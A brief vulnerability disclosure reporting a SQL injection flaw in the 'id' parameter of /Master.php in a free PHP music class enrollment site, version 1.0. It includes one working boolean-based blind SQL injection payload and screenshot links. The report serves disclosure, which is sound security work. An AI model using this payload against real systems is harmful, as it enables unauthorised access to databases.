# SQL injection vulnerability exists in the music course registration system

## Vulnerability author:liuyuanyuan

supplier:
https://www.sourcecodester.com/php/15362/music-class-enrollment-site-phpoop-free-source-code.html

edition: 
1.0

/Master.php

The Id parameter has SQL injection. Procedure

Payload: id=2' RLIKE (SELECT (CASE WHEN (8312=8312) THEN 2 ELSE 0x28 END))-- ZqkI

![图片](https://github.com/user-attachments/assets/7070816d-6a3d-4fc4-bc3b-94d2d7851a95)

![图片](https://github.com/user-attachments/assets/a218ebe5-204f-4e7f-baac-b50aa1953907)
